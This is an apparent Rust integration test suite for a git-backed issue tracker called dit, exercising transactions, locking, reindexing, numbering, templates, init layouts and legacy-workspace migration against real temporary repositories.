//! Facade tests against real git repositories.
//!
//! These exercise the whole pipeline the way the CLI and server will: a
//! transaction writes files, git commits them, the index absorbs the result,
//! and reads answer from the index alone. Nothing here mocks git, SQLite or
//! the filesystem — every failure mode that matters only exists when the
//! real pieces run.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::path::Path;

use dit_core::{DiagnosticLevel, Dit, DitError, ReindexMode};
use dit_model::{FieldPatch, IssueDraft, IssueKind, Numbering, Priority};
use dit_vcs::Repo;

/// A repo-local identity so commits never depend on the machine's global
/// git config (which may sign, rename, or refuse), plus a .gitignore that
/// keeps the index database out of git.
fn workspace(path: &Path) -> Dit {
    let repo = Repo::init(path).unwrap();
    repo.set_identity("DIT Test", "dit@test.local").unwrap();
    std::fs::write(
        path.join(".gitignore"),
        ".dit-cache/
",
    )
    .unwrap();
    repo.add(".gitignore").unwrap();
    repo.commit("bootstrap").unwrap();
    Dit::open(path).unwrap()
}

/// A repository that is a DIT workspace as far as `dit ai` is concerned: it
/// carries `.dit/config.yaml`, the marker `dit init` writes.
fn ai_workspace(path: &Path) -> Dit {
    let dit = workspace(path);
    std::fs::create_dir_all(path.join(".dit")).unwrap();
    std::fs::write(
        path.join(".dit/config.yaml"),
        "schema_version: 1\nlayout: root\nnumbering: local\n",
    )
    .unwrap();
    drop(dit);
    Dit::open(path).unwrap()
}

fn draft(title: &str) -> IssueDraft {
    IssueDraft {
        title: title.into(),
        kind: IssueKind::Bug,
        status: Some("todo".into()),
        priority: Some(Priority::P1),
        reporter: Some("farid".into()),
        assignees: vec!["farid".into()],
        labels: vec!["auth".into()],
        epic: None,
        estimate: Some(3),
        sprint: None,
        due: None,
        start: None,
        blocked_by: vec![],
        fed_by: vec![],
        lane: None,
        flows: Vec::new(),
        number: None,
        body: "Users get logged out.".into(),
    }
}

#[test]
fn open_rejects_a_plain_directory() {
    let tmp = tempfile::tempdir().unwrap();
    let err = Dit::open(tmp.path()).unwrap_err();
    assert!(
        err.to_string().contains("not inside a git repository"),
        "{err}"
    );
}

#[test]
fn a_committed_create_is_visible_to_every_read() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());

    let mut tx = dit.transaction("farid").unwrap();
    let id = tx.create_issue(draft("Login timeout")).unwrap();
    let short = id.short_ref().as_str().to_owned();
    let sha = tx.commit("create 1 issue").unwrap().unwrap();
    assert_eq!(sha.len(), 40);

    // By full id and by short ref, from the index.
    assert!(dit.get(id.as_str()).unwrap().is_some());
    let by_short = dit.get(&short).unwrap().expect("short ref resolves");
    assert_eq!(by_short.issue.id, id);
    // By DQL.
    let hits = dit.query("status = todo AND label = auth", None).unwrap();
    assert_eq!(hits.len(), 1, "{hits:?}");
    // History includes the creation events.
    let events = dit.history(&id, Some("status")).unwrap();
    assert_eq!(events.len(), 1, "{events:?}");
    assert_eq!(events[0].new_value.as_deref(), Some("todo"));
    // git saw exactly one commit, and the tree is clean.
    assert!(!dit.status().dirty);
}

#[test]
fn a_status_change_updates_the_index_and_appends_history() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx.create_issue(draft("Login timeout")).unwrap();
    tx.commit("create").unwrap();

    let mut tx = dit.transaction("budi").unwrap();
    tx.set_fields(
        &id,
        FieldPatch {
            status: Some("in_progress".into()),
            ..FieldPatch::default()
        },
    )
    .unwrap();
    tx.commit("start work").unwrap();

    let issue = dit.get(id.as_str()).unwrap().unwrap();
    assert_eq!(issue.issue.status, "in_progress");
    let events = dit.history(&id, Some("status")).unwrap();
    assert_eq!(events.len(), 2, "{events:?}");
    assert_eq!(events[1].old_value.as_deref(), Some("todo"));
    assert_eq!(events[1].new_value.as_deref(), Some("in_progress"));
    assert_eq!(
        events[1].author, "budi",
        "attribution follows the transaction author"
    );
}

#[test]
fn comments_are_written_committed_and_readable_from_the_index() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx.create_issue(draft("Login timeout")).unwrap();
    let cid = tx.comment(&id, "budi", None, "Reproduced on 3G.").unwrap();
    tx.commit("create with comment").unwrap();

    let comments = dit.comments(&id).unwrap();
    assert_eq!(comments.len(), 1);
    assert_eq!(comments[0].id, cid);
    assert_eq!(comments[0].author, "budi");
    assert_eq!(comments[0].body, "Reproduced on 3G.");
}

#[test]
fn abort_discards_everything_and_makes_no_commit() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let head_before = dit.status().head;

    let mut tx = dit.transaction("farid").unwrap();
    tx.create_issue(draft("Login timeout")).unwrap();
    tx.abort();

    assert_eq!(dit.status().head, head_before, "no commit happened");
    assert!(
        dit.query("", None).unwrap().is_empty(),
        "nothing was indexed"
    );
    assert!(!dit.status().dirty, "no stray files on disk");
    // The lock is gone, so the next writer can proceed.
    let mut tx = dit.transaction("farid").unwrap();
    tx.create_issue(draft("Fresh start")).unwrap();
    tx.commit("works after abort").unwrap().unwrap();
}

#[test]
fn a_second_writer_is_told_who_holds_the_lock() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut other = Dit::open(tmp.path()).unwrap();

    let _tx = dit.transaction("farid").unwrap();
    let err = other.transaction("budi").unwrap_err();
    match err {
        DitError::Busy { held_by } => assert_eq!(held_by, "farid"),
        other => panic!("expected Busy, got {other:?}"),
    }
}

#[test]
fn a_failed_git_commit_rolls_the_files_back() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    tx.create_issue(draft("Login timeout")).unwrap();
    // A stale git index lock makes `git add` fail after the files are already
    // on disk — a real post-write failure, not a simulated one.
    std::fs::write(tmp.path().join(".git/index.lock"), b"stale").unwrap();
    let err = tx.commit("create").unwrap_err();
    assert!(err.to_string().contains("git"), "{err}");
    std::fs::remove_file(tmp.path().join(".git/index.lock")).unwrap();
    assert!(!dit.status().dirty, "the written file was rolled back");
    assert!(dit.query("", None).unwrap().is_empty());
}

#[test]
fn reindex_rebuilds_a_deleted_index_from_git_alone() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx.create_issue(draft("Login timeout")).unwrap();
    tx.comment(&id, "budi", None, "Seen on Safari too.")
        .unwrap();
    tx.commit("create").unwrap();

    // Simulate a lost cache: a fresh Dit on a wiped database file.
    drop(dit);
    let cache = tmp.path().join(".dit-cache/index.sqlite");
    std::fs::remove_file(&cache).unwrap();
    let mut dit = Dit::open(tmp.path()).unwrap();
    // Open self-heals a missing cache before the first read (the upgrade
    // path), so the old "empty index answers nothing" contract is gone; the
    // explicit rebuild below still stands on its own for history recovery.
    assert!(
        dit.get(id.as_str()).unwrap().is_some(),
        "open rebuilds a missing index before reads"
    );

    let report = dit.reindex(ReindexMode::All).unwrap();
    assert_eq!(report.issues, 1, "{report:?}");
    assert_eq!(report.comments, 1, "{report:?}");
    assert!(report.events > 0, "{report:?}");
    assert!(report.skipped == 0, "{report:?}");

    assert!(dit.get(id.as_str()).unwrap().is_some());
    assert_eq!(dit.comments(&id).unwrap().len(), 1);
    assert_eq!(dit.history(&id, Some("status")).unwrap().len(), 1);
}

#[test]
fn the_board_groups_issues_by_workflow_column() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    let a = tx.create_issue(draft("First")).unwrap();
    let mut b_draft = draft("Second");
    b_draft.status = Some("in_progress".into());
    let b = tx.create_issue(b_draft).unwrap();
    tx.commit("two issues").unwrap();

    let board = dit.board().unwrap();
    let todo = board.columns.iter().find(|c| c.status == "todo").unwrap();
    let doing = board
        .columns
        .iter()
        .find(|c| c.status == "in_progress")
        .unwrap();
    assert_eq!(todo.issues.len(), 1);
    assert_eq!(todo.issues[0].issue.id, a);
    assert_eq!(doing.issues.len(), 1);
    assert_eq!(doing.issues[0].issue.id, b);
    // Column order follows the workflow declaration, not the data — and the
    // default workflow starts with backlog.
    assert_eq!(board.columns.first().unwrap().status, "backlog");
}

#[test]
fn doctor_names_what_is_wrong_and_what_would_break() {
    let tmp = tempfile::tempdir().unwrap();
    let dit = workspace(tmp.path());

    let fresh = dit.doctor();
    assert!(fresh
        .iter()
        .any(|d| d.code == "merge-driver" && d.level == DiagnosticLevel::Warn));

    let tx = Dit::open(tmp.path()).unwrap();
    // The merge driver contract needs an executable; any real file stands in.
    let driver = tmp.path().join("driver.sh");
    std::fs::write(
        &driver,
        "#!/bin/sh
exit 0
",
    )
    .unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&driver, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let repo = Repo::open(tmp.path()).unwrap();
    repo.configure_merge_driver(&format!("{} %O %A %B %L %P", driver.display()))
        .unwrap();
    drop(tx);

    let after = Dit::open(tmp.path()).unwrap().doctor();
    assert!(after
        .iter()
        .any(|d| d.code == "merge-driver" && d.level == DiagnosticLevel::Ok));
}

#[test]
fn an_unparsable_workflow_falls_back_but_is_flagged() {
    let tmp = tempfile::tempdir().unwrap();
    let dit = workspace(tmp.path());
    assert!(dit
        .doctor()
        .iter()
        .any(|d| d.code == "schema" && d.level == DiagnosticLevel::Ok));

    std::fs::create_dir_all(tmp.path().join(".dit/schema")).unwrap();
    std::fs::write(
        tmp.path().join(".dit/schema/workflow.yaml"),
        "statuses: [ broken
",
    )
    .unwrap();
    let dit = Dit::open(tmp.path()).unwrap();
    // Still opens, still has a usable default workflow.
    assert!(!dit.workflow().statuses.is_empty());
    assert!(dit
        .doctor()
        .iter()
        .any(|d| d.code == "schema" && d.level == DiagnosticLevel::Error));
}

/// `dit init` in a directory that already holds a project must join it, not
/// colonize it: the project's .gitignore keeps its lines (gaining only the
/// cache entry) and its README is left alone. Found by dogfooding init in
/// DIT's own repo — the first run rewrote both files and committed it.
#[test]
fn init_in_an_existing_project_preserves_gitignore_and_readme() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::write(
        tmp.path().join(".gitignore"),
        "/target
node_modules/
.env
",
    )
    .unwrap();
    std::fs::write(
        tmp.path().join("README.md"),
        "# My Project

Real docs.
",
    )
    .unwrap();

    Dit::init(tmp.path(), &std::env::current_exe().unwrap()).unwrap();

    let gitignore = std::fs::read_to_string(tmp.path().join(".gitignore")).unwrap();
    assert!(
        gitignore.contains("/target"),
        "existing lines survive:
{gitignore}"
    );
    assert!(gitignore.contains("node_modules/"));
    assert!(
        gitignore.contains(".dit-cache/"),
        "the cache entry is added:
{gitignore}"
    );

    let readme = std::fs::read_to_string(tmp.path().join("README.md")).unwrap();
    assert_eq!(
        readme,
        "# My Project

Real docs.
",
        "the README is untouched"
    );

    // The bootstrap commit carries the appended entry, not a clobbered file.
    let repo = Repo::open(tmp.path()).unwrap();
    let committed = repo.show_text("HEAD:.gitignore").unwrap_or_default();
    assert!(committed.contains("/target"), "history keeps the old lines");
}

/// A second init over an already-initialized workspace is a no-op on disk:
/// the ignore entry is present and no empty commit is created.
#[test]
fn init_twice_appends_once_and_skips_the_empty_commit() {
    let tmp = tempfile::tempdir().unwrap();
    Dit::init(tmp.path(), &std::env::current_exe().unwrap()).unwrap();
    let before = Repo::open(tmp.path()).unwrap().head().unwrap();
    let gitignore = std::fs::read_to_string(tmp.path().join(".gitignore")).unwrap();

    Dit::init(tmp.path(), &std::env::current_exe().unwrap()).unwrap();

    let after = Repo::open(tmp.path()).unwrap().head().unwrap();
    assert_eq!(before, after, "re-init must not move history");
    assert_eq!(
        std::fs::read_to_string(tmp.path().join(".gitignore")).unwrap(),
        gitignore,
        "the ignore entry is not duplicated"
    );
}

// -- ADR 0005–0008: visible layout, numbers, templates, generated index -----

use dit_core::DataLayout;
use dit_model::IssueId;

fn draft_with(title: &str, body: &str) -> IssueDraft {
    IssueDraft {
        title: title.into(),
        kind: IssueKind::Bug,
        status: Some("todo".into()),
        priority: Some(Priority::P1),
        reporter: Some("farid".into()),
        assignees: vec!["farid".into()],
        labels: vec!["auth".into()],
        epic: None,
        estimate: Some(3),
        sprint: None,
        due: None,
        start: None,
        blocked_by: vec![],
        fed_by: vec![],
        lane: None,
        flows: Vec::new(),
        number: None,
        body: body.into(),
    }
}

#[test]
fn init_scaffolds_the_visible_layout() {
    let tmp = tempfile::tempdir().unwrap();
    Dit::init(tmp.path(), &std::env::current_exe().unwrap()).unwrap();

    // The five content roots are visible at the tree root (ADR 0005).
    for root in dit_model::CONTENT_ROOTS {
        assert!(
            tmp.path().join(root).is_dir(),
            "{root} missing from the root"
        );
    }
    // Machinery stays hidden — and the config states where data goes.
    let config = std::fs::read_to_string(tmp.path().join(".dit/config.yaml")).unwrap();
    assert!(config.contains("layout: root"), "{config}");
    assert!(config.contains("numbering: local"), "{config}");

    // Merge-driver routing sits at the tree root (ADR 0005).
    let attrs = std::fs::read_to_string(tmp.path().join(".gitattributes")).unwrap();
    assert!(attrs.contains("*.md merge=dit-md"), "{attrs}");
    assert!(attrs.contains("**/comments/*.md merge=dit-md"), "{attrs}");

    // Issue templates are seeded (the evidence-first shape).
    assert!(tmp.path().join(".dit/templates/default.md").is_file());
    assert!(tmp.path().join(".dit/templates/bug.md").is_file());

    // All of it is committed — a fresh clone sees the same scaffolding.
    let repo = Repo::open(tmp.path()).unwrap();
    assert!(repo.show_text("HEAD:.gitattributes").is_some());
    assert!(repo.show_text("HEAD:.dit/config.yaml").is_some());
    assert!(repo
        .show_text("HEAD:.gitignore")
        .unwrap()
        .contains(".dit-cache/"));
}

#[test]
fn init_can_lay_out_dotdir_for_guest_repos() {
    let tmp = tempfile::tempdir().unwrap();
    Dit::init_with_layout(
        tmp.path(),
        &std::env::current_exe().unwrap(),
        DataLayout::DotDir,
    )
    .unwrap();

    assert!(tmp.path().join(".dit/issues").is_dir());
    assert!(
        !tmp.path().join("issues").exists(),
        "the root stays the host's"
    );
    let config = std::fs::read_to_string(tmp.path().join(".dit/config.yaml")).unwrap();
    assert!(config.contains("layout: dotdir"), "{config}");
    // The attributes file hides under .dit/ with the rest (Mode C).
    assert!(tmp.path().join(".dit/.gitattributes").is_file());
    assert!(!tmp.path().join(".gitattributes").exists());
}

/// A directory that already owns `issues/` is not ours to write into: init
/// refuses rather than colonizes (ADR 0005).
#[test]
fn init_refuses_a_tree_that_already_owns_a_content_root() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(tmp.path().join("issues/mine")).unwrap();
    std::fs::write(
        tmp.path().join("issues/mine/plan.md"),
        "# My stuff
",
    )
    .unwrap();
    let err = Dit::init(tmp.path(), &std::env::current_exe().unwrap()).unwrap_err();
    assert!(
        err.to_string().contains("issues"),
        "the refusal names the conflicting root: {err}"
    );
    assert!(
        !tmp.path().join(".gitattributes").exists(),
        "nothing was written before the refusal"
    );
}

/// Old workspaces (data under `.dit/issues/`, no `layout:` anywhere) must not
/// be silently split by a root-layout init — the migration command owns that
/// move.
#[test]
fn init_refuses_a_legacy_workspace_and_points_at_migration() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(tmp.path().join(".dit/issues/2026/08")).unwrap();
    let err = Dit::init(tmp.path(), &std::env::current_exe().unwrap()).unwrap_err();
    assert!(
        err.to_string().contains("migrate"),
        "the refusal offers the way out: {err}"
    );
}

#[test]
fn creation_assigns_sequential_numbers_when_numbering_is_local() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());

    let mut tx = dit.transaction("farid").unwrap();
    let a = tx.create_issue(draft_with("First", "Body.")).unwrap();
    // Two issues in ONE transaction must still count up — the index does not
    // know about the first staged issue yet, so the facade carries the cursor.
    let b = tx.create_issue(draft_with("Second", "Body.")).unwrap();
    tx.commit("two issues").unwrap();

    assert_eq!(dit.get(a.as_str()).unwrap().unwrap().issue.number, Some(1));
    assert_eq!(dit.get(b.as_str()).unwrap().unwrap().issue.number, Some(2));

    // The next writer starts from the indexed max, not from 1 again.
    let mut tx = dit.transaction("farid").unwrap();
    let c = tx.create_issue(draft_with("Third", "Body.")).unwrap();
    tx.commit("third").unwrap();
    assert_eq!(dit.get(c.as_str()).unwrap().unwrap().issue.number, Some(3));

    // Numbers are queryable in DQL.
    let hits = dit.query("number = 2", None).unwrap();
    assert_eq!(hits.len(), 1);
    assert_eq!(hits[0].issue.id, b);

    // And `#2` resolves like a short ref does.
    assert_eq!(dit.get("#2").unwrap().unwrap().issue.id, b);
    assert!(dit.get("#99").unwrap().is_none());
}

#[test]
fn on_merge_numbering_leaves_numbers_unset_until_the_bot_assigns_them() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".dit")).unwrap();
    std::fs::write(
        tmp.path().join(".dit/config.yaml"),
        "schema_version: 1
layout: dotdir
numbering: on-merge
",
    )
    .unwrap();
    dit.reindex(ReindexMode::State).unwrap();

    let mut tx = dit.transaction("farid").unwrap();
    let id = tx.create_issue(draft_with("Unnumbered", "Body.")).unwrap();
    tx.commit("create").unwrap();

    assert_eq!(dit.get(id.as_str()).unwrap().unwrap().issue.number, None);
}

#[test]
fn set_numbering_flips_the_policy_and_takes_effect_immediately() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());

    dit.set_numbering(Numbering::OnMerge).unwrap();
    assert_eq!(dit.config().numbering, Numbering::OnMerge);
    // The change is committed, not left dirty in the tree.
    assert!(!dit.status().dirty);

    let mut tx = dit.transaction("farid").unwrap();
    let id = tx
        .create_issue(draft_with("Bot will number me", "Body."))
        .unwrap();
    tx.commit("create").unwrap();
    assert_eq!(dit.get(id.as_str()).unwrap().unwrap().issue.number, None);

    // And back: local numbering resumes from the indexed max.
    dit.set_numbering(Numbering::Local).unwrap();
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx
        .create_issue(draft_with("Numbered again", "Body."))
        .unwrap();
    tx.commit("create").unwrap();
    assert_eq!(dit.get(id.as_str()).unwrap().unwrap().issue.number, Some(1));

    // The written config round-trips through a fresh open.
    let reopened = Dit::open(tmp.path()).unwrap();
    assert_eq!(reopened.config().numbering, Numbering::Local);
}

#[test]
fn renumber_backfills_unnumbered_issues_append_only() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());

    // #1 and #2 exist before the legacy pair — their numbers must not move.
    let mut tx = dit.transaction("farid").unwrap();
    tx.create_issue(draft_with("First", "Body.")).unwrap();
    tx.create_issue(draft_with("Second", "Body.")).unwrap();
    tx.commit("two numbered").unwrap();

    // Two "legacy" issues: created under on-merge, so they have no number.
    dit.set_numbering(Numbering::OnMerge).unwrap();
    let mut tx = dit.transaction("farid").unwrap();
    let older = tx
        .create_issue(draft_with("Older legacy", "Body."))
        .unwrap();
    let newer = tx
        .create_issue(draft_with("Newer legacy", "Body."))
        .unwrap();
    tx.commit("two legacy").unwrap();
    dit.set_numbering(Numbering::Local).unwrap();

    let count = dit.renumber().unwrap();
    assert_eq!(count, 2, "exactly the unnumbered issues gain a number");
    assert_eq!(
        dit.get(older.as_str()).unwrap().unwrap().issue.number,
        Some(3)
    );
    assert_eq!(
        dit.get(newer.as_str()).unwrap().unwrap().issue.number,
        Some(4)
    );
    assert!(
        older.as_str() < newer.as_str(),
        "fixture sanity: ULID order must be creation order here"
    );

    // The assignment is a visible, ordinary field edit (ADR 0009).
    let events = dit.history(&older, Some("number")).unwrap();
    assert_eq!(
        events.len(),
        1,
        "backfill logs a number field event: {events:?}"
    );

    // Append-only in one reviewable commit, and the tree is clean after.
    assert!(!dit.status().dirty);
    let head = std::process::Command::new("git")
        .args(["log", "--oneline", "-1", "--format=%s"])
        .current_dir(tmp.path())
        .output()
        .unwrap();
    assert_eq!(
        String::from_utf8_lossy(&head.stdout).trim(),
        "dit renumber: 2 issue(s)",
        "the backfill is a single commit"
    );

    // Idempotent: nothing left to do means no commit, not an error.
    assert_eq!(dit.renumber().unwrap(), 0);
    assert!(!dit.status().dirty);
}

#[test]
fn renumber_refuses_where_merge_serialization_owns_numbers() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.set_numbering(Numbering::OnMerge).unwrap();

    let err = dit.renumber().unwrap_err();
    assert!(
        err.to_string().contains("on-merge"),
        "the refusal names the policy that owns assignment: {err}"
    );
    assert!(!dit.status().dirty, "a refusal changes nothing");
}

#[test]
fn renumber_requires_a_clean_tree() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    std::fs::write(tmp.path().join("scratch.txt"), "uncommitted").unwrap();

    let err = dit.renumber().unwrap_err();
    assert!(
        err.to_string().contains("not clean"),
        "the refusal says what to do: {err}"
    );
}

#[test]
fn an_empty_body_is_seeded_from_the_issue_template() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = Dit::init(tmp.path(), &std::env::current_exe().unwrap()).unwrap();

    // A kind with no template of its own (task) falls back to default.md.
    let mut draft = draft_with("Blank", "");
    draft.kind = IssueKind::Task;
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx.create_issue(draft).unwrap();
    tx.commit("create").unwrap();
    let path = &dit.get(id.as_str()).unwrap().unwrap().path;
    let body = std::fs::read_to_string(tmp.path().join(path)).unwrap();
    assert!(
        body.contains("## Summary")
            && body.contains("## Acceptance criteria")
            && body.contains("## Do not"),
        "the default template's sections are seeded:
{body}"
    );

    // The issue's own kind seeds the body when no template is named.
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx.create_issue(draft_with("Crash", "")).unwrap();
    tx.commit("create").unwrap();
    let path = &dit.get(id.as_str()).unwrap().unwrap().path;
    let body = std::fs::read_to_string(tmp.path().join(path)).unwrap();
    assert!(
        body.contains("## Steps to reproduce") && body.contains("## Guard"),
        "the bug template's sections are seeded:
{body}"
    );

    // A named template wins over the kind default.
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx
        .create_issue_from_template(draft_with("Crash", ""), "story")
        .unwrap();
    tx.commit("create").unwrap();
    let path = &dit.get(id.as_str()).unwrap().unwrap().path;
    let body = std::fs::read_to_string(tmp.path().join(path)).unwrap();
    assert!(body.contains("## Model"), "{body}");

    // A name that is not a template is an error, not a silent default.
    let mut tx = dit.transaction("farid").unwrap();
    let err = tx
        .create_issue_from_template(draft_with("X", ""), "nope")
        .unwrap_err();
    assert!(err.to_string().contains("nope"), "{err}");
}

#[test]
fn the_generated_index_lists_issues_by_number_and_is_deterministic() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    tx.create_issue(draft_with("First", "Body.")).unwrap();
    tx.create_issue(draft_with("Second", "Body.")).unwrap();
    tx.commit("two issues").unwrap();

    assert!(dit.build_docs_index().unwrap(), "the first build writes");
    let index_path = tmp.path().join("issues/README.md");
    let first = std::fs::read_to_string(&index_path).unwrap();
    assert!(
        first.starts_with("<!-- generated by dit"),
        "the marker is the first thing in the file:
{first}"
    );
    assert!(first.contains("#1"), "{first}");
    assert!(
        first.contains("[First]("),
        "entries link into the folder: {first}"
    );
    assert!(
        first.contains("](2026/"),
        "links are relative to the issues root: {first}"
    );

    // Regeneration from an unchanged repo is byte-identical — otherwise every
    // CI run would commit churn (ADR 0008, determinism).
    assert!(
        !dit.build_docs_index().unwrap(),
        "an up-to-date index is not rewritten"
    );
    assert_eq!(std::fs::read_to_string(&index_path).unwrap(), first);

    // The generated file is an output, never an input (ADR 0008): it is not
    // an issue, not even a skipped one.
    let report = dit.reindex(ReindexMode::All).unwrap();
    assert_eq!(report.issues, 2, "{report:?}");
    assert_eq!(report.skipped, 0, "{report:?}");
}

#[test]
fn the_generated_index_shows_a_bare_short_ref_when_there_is_no_number() {
    // On-merge numbering (and every pre-ADR-0007 issue) has `number: None`.
    // A `#` belongs to numbers alone — `#06M5683` reads as a number handle
    // and is exactly what a legacy workspace would render.
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.set_numbering(Numbering::OnMerge).unwrap();
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx.create_issue(draft_with("Unnumbered", "Body.")).unwrap();
    tx.commit("one issue").unwrap();
    let short = id.short_ref().as_str().to_owned();

    dit.build_docs_index().unwrap();
    let index = std::fs::read_to_string(tmp.path().join("issues/README.md")).unwrap();
    assert!(
        index.contains(&format!("- **{short}** [Unnumbered](")),
        "an unnumbered issue shows its bare short ref:
{index}"
    );
    assert!(
        !index.contains(&format!("#{short}")),
        "the hash is reserved for numbers:
{index}"
    );
}

#[test]
fn doctor_flags_duplicate_numbers_as_an_error() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    let a = tx.create_issue(draft_with("First", "Body.")).unwrap();
    let b = tx.create_issue(draft_with("Second", "Body.")).unwrap();
    tx.commit("two issues").unwrap();

    let before = dit.doctor();
    assert!(
        before
            .iter()
            .any(|d| d.code == "numbers" && d.level == DiagnosticLevel::Ok),
        "{before:?}"
    );

    // The repair hatch: a hand renumber that collides is visible in doctor.
    let mut tx = dit.transaction("farid").unwrap();
    tx.set_fields(
        &b,
        FieldPatch {
            number: Some(1),
            ..FieldPatch::default()
        },
    )
    .unwrap();
    tx.commit("renumber").unwrap();
    let _ = a;

    let after = dit.doctor();
    assert!(
        after
            .iter()
            .any(|d| d.code == "numbers" && d.level == DiagnosticLevel::Error),
        "{after:?}"
    );
}

#[test]
fn doctor_warns_about_unnumbered_issues_only_where_backfill_applies() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());

    // A legacy unnumbered issue under `local` numbering: doctor points at
    // the way out (ADR 0009).
    dit.set_numbering(Numbering::OnMerge).unwrap();
    let mut tx = dit.transaction("farid").unwrap();
    tx.create_issue(draft_with("Legacy", "Body.")).unwrap();
    tx.commit("create").unwrap();
    dit.set_numbering(Numbering::Local).unwrap();

    let warned = dit.doctor();
    assert!(
        warned.iter().any(|d| d.code == "numbers"
            && d.level == DiagnosticLevel::Warn
            && d.message.contains("dit renumber")),
        "{warned:?}"
    );

    // Backfilling clears it.
    dit.renumber().unwrap();
    let healed = dit.doctor();
    assert!(
        healed
            .iter()
            .any(|d| d.code == "numbers" && d.level == DiagnosticLevel::Ok),
        "{healed:?}"
    );

    // And under `on-merge` a fresh unnumbered issue is by design: no warn.
    dit.set_numbering(Numbering::OnMerge).unwrap();
    let mut tx = dit.transaction("farid").unwrap();
    tx.create_issue(draft_with("Bot numbers me at merge", "Body."))
        .unwrap();
    tx.commit("create").unwrap();
    let by_design = dit.doctor();
    assert!(
        by_design
            .iter()
            .any(|d| d.code == "numbers" && d.level == DiagnosticLevel::Ok),
        "{by_design:?}"
    );
}

/// The legacy fixture: a pre-ADR-0005 workspace — data under `.dit/issues/`,
/// bodies still named `issue.md`, no `layout:` in config. Field names are the
/// on-disk wire format (`type:`, not `kind:`).
fn legacy_issue() -> &'static str {
    "---
\
     id: 01M08FFCAG185N2V5RTGBCDEFH
\
     title: Fix login timeout
\
     type: bug
\
     status: todo
\
     priority: p1
\
     reporter: farid
\
     assignees: [farid]
\
     labels: [auth]
\
     created: 2026-08-01T09:00:00Z
\
     updated: 2026-08-01T09:00:00Z
\
     ---

\
     Users get logged out.
"
}

#[test]
fn migrate_layout_moves_a_legacy_dotdir_workspace_to_the_root() {
    let tmp = tempfile::tempdir().unwrap();
    let repo = Repo::init(tmp.path()).unwrap();
    repo.set_identity("DIT Test", "dit@test.local").unwrap();
    std::fs::write(
        tmp.path().join(".gitignore"),
        ".dit-cache/
",
    )
    .unwrap();
    let dir = tmp
        .path()
        .join(".dit/issues/2026/08/01M08FFCAG-185N-fix-login");
    std::fs::create_dir_all(dir.join("comments")).unwrap();
    std::fs::write(dir.join("issue.md"), legacy_issue()).unwrap();
    std::fs::write(
        dir.join("comments/01M08FFCAX-185N-budi.md"),
        "---
id: 01M08FFCAX185N2W5RTGBCDEFH
author: budi
created: 2026-08-01T10:00:00Z
---

Seen on Safari too.
",
    )
    .unwrap();
    repo.add(".gitignore").unwrap();
    repo.add(".dit").unwrap();
    repo.commit("legacy workspace").unwrap();

    let mut dit = Dit::open(tmp.path()).unwrap();
    assert_eq!(dit.layout(), DataLayout::DotDir, "detected as legacy");

    let report = dit.migrate_layout(DataLayout::Root).unwrap();
    assert_eq!(report.roots_moved, 1, "{report:?}");
    assert_eq!(report.bodies_renamed, 1, "{report:?}");

    // Content now lives at the visible root, with README.md bodies.
    let new_body = tmp
        .path()
        .join("issues/2026/08/01M08FFCAG-185N-fix-login/README.md");
    assert!(new_body.is_file(), "the body was renamed in place");
    assert!(
        !tmp.path().join(".dit/issues").exists(),
        "the old tree is gone"
    );
    let config = std::fs::read_to_string(tmp.path().join(".dit/config.yaml")).unwrap();
    assert!(config.contains("layout: root"), "{config}");
    assert!(
        tmp.path().join(".gitattributes").is_file(),
        "attributes moved too"
    );

    // Everything survived: issue, comment, history — reindexed from the move.
    let id = IssueId::parse("01M08FFCAG185N2V5RTGBCDEFH").unwrap();
    assert!(dit.get(id.as_str()).unwrap().is_some());
    assert_eq!(dit.comments(&id).unwrap().len(), 1);
    assert!(!dit.history(&id, Some("status")).unwrap().is_empty());
    assert!(!dit.status().dirty, "the migration is one clean commit");

    // And new writes land in the new place, numbered after a rebuilt index.
    let mut tx = dit.transaction("farid").unwrap();
    let c = tx
        .create_issue(draft_with("Post-migration", "Body."))
        .unwrap();
    tx.commit("after migration").unwrap();
    assert!(dit
        .get(c.as_str())
        .unwrap()
        .unwrap()
        .path
        .starts_with("issues/"));
}

#[test]
